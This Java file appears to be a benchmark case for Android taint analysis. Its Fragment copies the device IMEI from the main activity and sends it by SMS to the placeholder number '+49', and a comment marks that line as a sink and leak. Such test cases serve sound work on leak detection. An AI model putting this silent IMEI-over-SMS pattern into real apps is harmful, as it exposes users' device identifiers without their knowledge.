package de.ecspride;

import android.app.Activity;
import android.app.Fragment;
import android.os.Bundle;
import android.telephony.SmsManager;

public class ExampleFragment extends Fragment {

    private static String imei = "";

    @Override
    public void onActivityCreated(Bundle savedInstanceState) {
        SmsManager sms = SmsManager.getDefault();
        // sink, leak
        sms.sendTextMessage("+49", null, imei, null, null);
    }

    @Override
    public void onAttach(Activity activity) {
        imei = MainActivity.imei;
    }
}
